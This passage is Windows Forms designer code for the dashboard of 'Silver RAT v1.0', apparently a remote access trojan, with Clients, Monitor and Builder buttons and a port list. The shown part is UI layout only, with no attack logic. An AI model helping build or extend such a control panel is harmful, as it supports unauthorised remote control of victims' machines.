        this.ListSocketPort.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.Black;
        // 
        // dataGridViewTextBoxColumn3
        // 
        this.dataGridViewTextBoxColumn3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        dataGridViewCellStyle23.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        this.dataGridViewTextBoxColumn3.DefaultCellStyle = dataGridViewCellStyle23;
        this.dataGridViewTextBoxColumn3.HeaderText = "Port";
        this.dataGridViewTextBoxColumn3.Name = "dataGridViewTextBoxColumn3";
        this.dataGridViewTextBoxColumn3.ReadOnly = true;
        // 
        // bunifuLabel17
        // 
        this.bunifuLabel17.AllowParentOverrides = false;
        this.bunifuLabel17.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel17.AutoEllipsis = false;
        this.bunifuLabel17.AutoSize = false;
        this.bunifuLabel17.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.bunifuLabel17.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel17.Location = new System.Drawing.Point(331, 599);
        this.bunifuLabel17.Name = "bunifuLabel17";
        this.bunifuLabel17.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel17.Size = new System.Drawing.Size(331, 15);
        this.bunifuLabel17.TabIndex = 604;
        this.bunifuLabel17.Text = "© Copyright Silver RAT v1.0. All Rights Reserved";
        this.bunifuLabel17.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel17.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ButtonMune
        // 
        this.ButtonMune.AllowAnimations = true;
        this.ButtonMune.AllowBorderColorChanges = true;
        this.ButtonMune.AllowMouseEffects = true;
        this.ButtonMune.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtonMune.AnimationSpeed = 200;
        this.ButtonMune.BackColor = System.Drawing.Color.Transparent;
        this.ButtonMune.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ButtonMune.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ButtonMune.BorderRadius = 1;
        this.ButtonMune.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
        this.ButtonMune.BorderThickness = 1;
        this.ButtonMune.ColorContrastOnClick = 30;
        this.ButtonMune.ColorContrastOnHover = 30;
        this.ButtonMune.Cursor = System.Windows.Forms.Cursors.Hand;
        borderEdges1.BottomLeft = true;
        borderEdges1.BottomRight = true;
        borderEdges1.TopLeft = true;
        borderEdges1.TopRight = true;
        this.ButtonMune.CustomizableEdges = borderEdges1;
        this.ButtonMune.DialogResult = System.Windows.Forms.DialogResult.None;
        this.ButtonMune.Image = global::SilverRAT.Properties.Resources.InfoProfile;
        this.ButtonMune.ImageMargin = new System.Windows.Forms.Padding(0);
        this.ButtonMune.Location = new System.Drawing.Point(968, 39);
        this.ButtonMune.Name = "ButtonMune";
        this.ButtonMune.RoundBorders = true;
        this.ButtonMune.ShowBorders = true;
        this.ButtonMune.Size = new System.Drawing.Size(38, 38);
        this.ButtonMune.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Round;
        this.ButtonMune.TabIndex = 603;
        this.ButtonMune.Click += new System.EventHandler(this.ButtonMune_Click);
        // 
        // PaneControll
        // 
        this.PaneControll.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)));
        this.PaneControll.Controls.Add(this.ButSettings);
        this.PaneControll.Controls.Add(this.ButAbout);
        this.PaneControll.Controls.Add(this.ButNotif);
        this.PaneControll.Controls.Add(this.ButBuilder);
        this.PaneControll.Controls.Add(this.ButClients);
        this.PaneControll.Controls.Add(this.ButMonitor);
        this.PaneControll.Controls.Add(this.ButDashboard);
        this.PaneControll.Location = new System.Drawing.Point(13, 170);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 444);
        this.PaneControll.TabIndex = 602;
        this.PaneControll.Visible = false;
        // 
        // ButSettings
        // 
        this.ButSettings.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButSettings.BackColor = System.Drawing.Color.Transparent;
        this.ButSettings.BorderRadius = 10;
        this.ButSettings.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButSettings.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButSettings.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButSettings.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButSettings.CheckedState.Parent = this.ButSettings;
        this.ButSettings.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButSettings.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.CustomImages.CheckedImage = global::SilverRAT.Properties.Resources.Settings2;
        this.ButSettings.CustomImages.HoveredImage = global::SilverRAT.Properties.Resources.Settings2;
        this.ButSettings.CustomImages.Image = global::SilverRAT.Properties.Resources.Settings1;
        this.ButSettings.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButSettings.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButSettings.CustomImages.Parent = this.ButSettings;
        this.ButSettings.FillColor = System.Drawing.Color.White;
        this.ButSettings.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButSettings.ForeColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.FillColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButSettings.HoverState.Parent = this.ButSettings;
        this.ButSettings.ImageSize = new System.Drawing.Size(27, 27);
        this.ButSettings.Location = new System.Drawing.Point(3, 240);
        this.ButSettings.Name = "ButSettings";
        this.ButSettings.PressedColor = System.Drawing.Color.White;
        this.ButSettings.ShadowDecoration.Parent = this.ButSettings;
        this.ButSettings.Size = new System.Drawing.Size(38, 38);
        this.ButSettings.TabIndex = 14;
        this.ButSettings.UseTransparentBackground = true;
        this.ButSettings.Click += new System.EventHandler(this.ButSettings_Click);
        // 
        // ButAbout
        // 
        this.ButAbout.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.ButAbout.BackColor = System.Drawing.Color.Transparent;
        this.ButAbout.BorderRadius = 10;
        this.ButAbout.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButAbout.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButAbout.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAbout.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButAbout.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButAbout.CheckedState.Parent = this.ButAbout;
        this.ButAbout.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButAbout.CustomBorderColor = System.Drawing.Color.White;
        this.ButAbout.CustomImages.CheckedImage = global::SilverRAT.Properties.Resources.About2;
        this.ButAbout.CustomImages.HoveredImage = global::SilverRAT.Properties.Resources.About2;
        this.ButAbout.CustomImages.Image = global::SilverRAT.Properties.Resources.About1;
        this.ButAbout.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButAbout.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButAbout.CustomImages.Parent = this.ButAbout;
        this.ButAbout.FillColor = System.Drawing.Color.White;
        this.ButAbout.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButAbout.ForeColor = System.Drawing.Color.White;
        this.ButAbout.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButAbout.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAbout.HoverState.FillColor = System.Drawing.Color.White;
        this.ButAbout.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButAbout.HoverState.Parent = this.ButAbout;
        this.ButAbout.ImageSize = new System.Drawing.Size(27, 27);
        this.ButAbout.Location = new System.Drawing.Point(3, 403);
        this.ButAbout.Name = "ButAbout";
        this.ButAbout.PressedColor = System.Drawing.Color.White;
        this.ButAbout.ShadowDecoration.Parent = this.ButAbout;
        this.ButAbout.Size = new System.Drawing.Size(38, 38);
        this.ButAbout.TabIndex = 15;
        this.ButAbout.UseTransparentBackground = true;
        this.ButAbout.Click += new System.EventHandler(this.ButAbout_Click);
        // 
        // ButNotif
        // 
        this.ButNotif.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButNotif.BackColor = System.Drawing.Color.Transparent;
        this.ButNotif.BorderRadius = 10;
        this.ButNotif.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButNotif.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButNotif.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButNotif.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButNotif.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButNotif.CheckedState.Parent = this.ButNotif;
        this.ButNotif.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButNotif.CustomBorderColor = System.Drawing.Color.White;
        this.ButNotif.CustomImages.CheckedImage = global::SilverRAT.Properties.Resources.Notif2;
        this.ButNotif.CustomImages.HoveredImage = global::SilverRAT.Properties.Resources.Notif2;
        this.ButNotif.CustomImages.Image = global::SilverRAT.Properties.Resources.Notif1;
        this.ButNotif.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButNotif.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButNotif.CustomImages.Parent = this.ButNotif;
        this.ButNotif.FillColor = System.Drawing.Color.White;
        this.ButNotif.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButNotif.ForeColor = System.Drawing.Color.White;
        this.ButNotif.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButNotif.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButNotif.HoverState.FillColor = System.Drawing.Color.White;
        this.ButNotif.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButNotif.HoverState.Parent = this.ButNotif;
        this.ButNotif.ImageSize = new System.Drawing.Size(27, 27);
        this.ButNotif.Location = new System.Drawing.Point(3, 152);
        this.ButNotif.Name = "ButNotif";
        this.ButNotif.PressedColor = System.Drawing.Color.White;
        this.ButNotif.ShadowDecoration.Parent = this.ButNotif;
        this.ButNotif.Size = new System.Drawing.Size(38, 38);
        this.ButNotif.TabIndex = 13;
        this.ButNotif.UseTransparentBackground = true;
        this.ButNotif.Click += new System.EventHandler(this.ButNotif_Click);
        // 
        // ButBuilder
        // 
        this.ButBuilder.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButBuilder.BackColor = System.Drawing.Color.Transparent;
        this.ButBuilder.BorderRadius = 10;
        this.ButBuilder.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButBuilder.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButBuilder.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButBuilder.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButBuilder.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButBuilder.CheckedState.Parent = this.ButBuilder;
        this.ButBuilder.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButBuilder.CustomBorderColor = System.Drawing.Color.White;
        this.ButBuilder.CustomImages.CheckedImage = global::SilverRAT.Properties.Resources.Builder2;
        this.ButBuilder.CustomImages.HoveredImage = global::SilverRAT.Properties.Resources.Builder2;
        this.ButBuilder.CustomImages.Image = global::SilverRAT.Properties.Resources.Builder1;
        this.ButBuilder.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButBuilder.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButBuilder.CustomImages.Parent = this.ButBuilder;
        this.ButBuilder.FillColor = System.Drawing.Color.White;
        this.ButBuilder.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButBuilder.ForeColor = System.Drawing.Color.White;
        this.ButBuilder.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButBuilder.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButBuilder.HoverState.FillColor = System.Drawing.Color.White;
        this.ButBuilder.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButBuilder.HoverState.Parent = this.ButBuilder;
        this.ButBuilder.ImageSize = new System.Drawing.Size(27, 27);
        this.ButBuilder.Location = new System.Drawing.Point(3, 196);
        this.ButBuilder.Name = "ButBuilder";
        this.ButBuilder.PressedColor = System.Drawing.Color.White;
        this.ButBuilder.ShadowDecoration.Parent = this.ButBuilder;
        this.ButBuilder.Size = new System.Drawing.Size(38, 38);
        this.ButBuilder.TabIndex = 12;
        this.ButBuilder.UseTransparentBackground = true;
        this.ButBuilder.Click += new System.EventHandler(this.ButBuilder_Click);
        // 
        // ButClients
        // 
        this.ButClients.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButClients.BackColor = System.Drawing.Color.Transparent;
        this.ButClients.BorderRadius = 10;
        this.ButClients.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButClients.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButClients.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButClients.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButClients.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButClients.CheckedState.Parent = this.ButClients;
        this.ButClients.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButClients.CustomBorderColor = System.Drawing.Color.White;
        this.ButClients.CustomImages.CheckedImage = global::SilverRAT.Properties.Resources.Clients2;
        this.ButClients.CustomImages.HoveredImage = global::SilverRAT.Properties.Resources.Clients2;
        this.ButClients.CustomImages.Image = global::SilverRAT.Properties.Resources.Clients1;
        this.ButClients.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButClients.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButClients.CustomImages.Parent = this.ButClients;
        this.ButClients.FillColor = System.Drawing.Color.White;
        this.ButClients.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButClients.ForeColor = System.Drawing.Color.White;
        this.ButClients.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButClients.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButClients.HoverState.FillColor = System.Drawing.Color.White;
        this.ButClients.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButClients.HoverState.Parent = this.ButClients;
        this.ButClients.ImageSize = new System.Drawing.Size(27, 27);
        this.ButClients.Location = new System.Drawing.Point(3, 108);
        this.ButClients.Name = "ButClients";
        this.ButClients.PressedColor = System.Drawing.Color.White;
        this.ButClients.ShadowDecoration.Parent = this.ButClients;
        this.ButClients.Size = new System.Drawing.Size(38, 38);
        this.ButClients.TabIndex = 11;
        this.ButClients.UseTransparentBackground = true;
        this.ButClients.Click += new System.EventHandler(this.ButClients_Click);
        // 
        // ButMonitor
        // 
        this.ButMonitor.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButMonitor.BackColor = System.Drawing.Color.Transparent;
        this.ButMonitor.BorderRadius = 10;
        this.ButMonitor.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButMonitor.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButMonitor.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButMonitor.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButMonitor.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButMonitor.CheckedState.Parent = this.ButMonitor;
        this.ButMonitor.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButMonitor.CustomBorderColor = System.Drawing.Color.White;
        this.ButMonitor.CustomImages.CheckedImage = global::SilverRAT.Properties.Resources.Monitor2;
        this.ButMonitor.CustomImages.HoveredImage = global::SilverRAT.Properties.Resources.Monitor2;
        this.ButMonitor.CustomImages.Image = global::SilverRAT.Properties.Resources.Monitor1;
        this.ButMonitor.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButMonitor.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButMonitor.CustomImages.Parent = this.ButMonitor;
        this.ButMonitor.FillColor = System.Drawing.Color.White;
        this.ButMonitor.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButMonitor.ForeColor = System.Drawing.Color.White;
        this.ButMonitor.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButMonitor.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButMonitor.HoverState.FillColor = System.Drawing.Color.White;
        this.ButMonitor.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButMonitor.HoverState.Parent = this.ButMonitor;
        this.ButMonitor.ImageSize = new System.Drawing.Size(27, 27);
        this.ButMonitor.Location = new System.Drawing.Point(3, 64);
        this.ButMonitor.Name = "ButMonitor";
        this.ButMonitor.PressedColor = System.Drawing.Color.White;
        this.ButMonitor.ShadowDecoration.Parent = this.ButMonitor;
        this.ButMonitor.Size = new System.Drawing.Size(38, 38);
        this.ButMonitor.TabIndex = 10;
        this.ButMonitor.UseTransparentBackground = true;
        this.ButMonitor.Click += new System.EventHandler(this.ButMonitor_Click);
        // 
        // ButDashboard
        // 
        this.ButDashboard.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButDashboard.BackColor = System.Drawing.Color.Transparent;
        this.ButDashboard.BorderRadius = 10;
        this.ButDashboard.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButDashboard.Checked = true;
        this.ButDashboard.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButDashboard.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButDashboard.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButDashboard.CheckedState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButDashboard.CheckedState.Parent = this.ButDashboard;
        this.ButDashboard.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButDashboard.CustomBorderColor = System.Drawing.Color.White;
        this.ButDashboard.CustomImages.CheckedImage = ((System.Drawing.Image)(resources.GetObject("ButDashboard.CustomImages.CheckedImage")));
        this.ButDashboard.CustomImages.HoveredImage = ((System.Drawing.Image)(resources.GetObject("ButDashboard.CustomImages.HoveredImage")));
        this.ButDashboard.CustomImages.Image = ((System.Drawing.Image)(resources.GetObject("ButDashboard.CustomImages.Image")));
        this.ButDashboard.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButDashboard.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButDashboard.CustomImages.Parent = this.ButDashboard;
        this.ButDashboard.FillColor = System.Drawing.Color.White;
        this.ButDashboard.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButDashboard.ForeColor = System.Drawing.Color.White;
        this.ButDashboard.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButDashboard.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButDashboard.HoverState.FillColor = System.Drawing.Color.White;
        this.ButDashboard.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.ButDashboard.HoverState.Parent = this.ButDashboard;
        this.ButDashboard.ImageSize = new System.Drawing.Size(27, 27);
        this.ButDashboard.Location = new System.Drawing.Point(3, 20);
        this.ButDashboard.Name = "ButDashboard";
        this.ButDashboard.PressedColor = System.Drawing.Color.White;
        this.ButDashboard.ShadowDecoration.Parent = this.ButDashboard;
        this.ButDashboard.Size = new System.Drawing.Size(38, 38);
        this.ButDashboard.TabIndex = 9;
        this.ButDashboard.UseTransparentBackground = true;
        this.ButDashboard.Click += new System.EventHandler(this.ButDashboard_Click);
        // 
        // TitlePage
        // 
        this.TitlePage.AllowParentOverrides = false;
        this.TitlePage.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.TitlePage.AutoEllipsis = false;
        this.TitlePage.AutoSize = false;
        this.TitlePage.BackColor = System.Drawing.Color.White;
        this.TitlePage.Cursor = System.Windows.Forms.Cursors.Default;
        this.TitlePage.CursorType = System.Windows.Forms.Cursors.Default;
        this.TitlePage.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.TitlePage.ForeColor = System.Drawing.Color.Gray;
        this.TitlePage.Location = new System.Drawing.Point(331, 15);
        this.TitlePage.Name = "TitlePage";
        this.TitlePage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlePage.Size = new System.Drawing.Size(331, 17);
        this.TitlePage.TabIndex = 601;
        this.TitlePage.Text = "Welcome to Silver dashboard ";
        this.TitlePage.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.TitlePage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // FormResizeBox1
        // 
        this.FormResizeBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.FormResizeBox1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(997, 598);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        // 
        // ButtClose
        // 
        this.ButtClose.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(997, 12);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 565;
        this.ButtClose.Click += new System.EventHandler(this.ButtClose_Click);
        // 
        // ButtonMaximized
        // 
        this.ButtonMaximized.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(190)))), ((int)(((byte)(83)))));
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(973, 12);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 566;
        this.ButtonMaximized.Click += new System.EventHandler(this.ButtonMaximized_Click);
        // 
        // PanelBottom
        // 
        this.PanelBottom.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelBottom.BackgroundImage")));
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(331, 617);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = false;
        this.PanelBottom.Size = new System.Drawing.Size(331, 25);
        this.PanelBottom.TabIndex = 594;
        // 
        // ButtionMinimized
        // 
        this.ButtionMinimized.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(97)))), ((int)(((byte)(196)))), ((int)(((byte)(83)))));
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(949, 12);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 567;
        this.ButtionMinimized.Click += new System.EventHandler(this.ButtionMinimized_Click);
        // 
        // PanelLeft
        // 
        this.PanelLeft.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)));
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelLeft.BackgroundImage")));
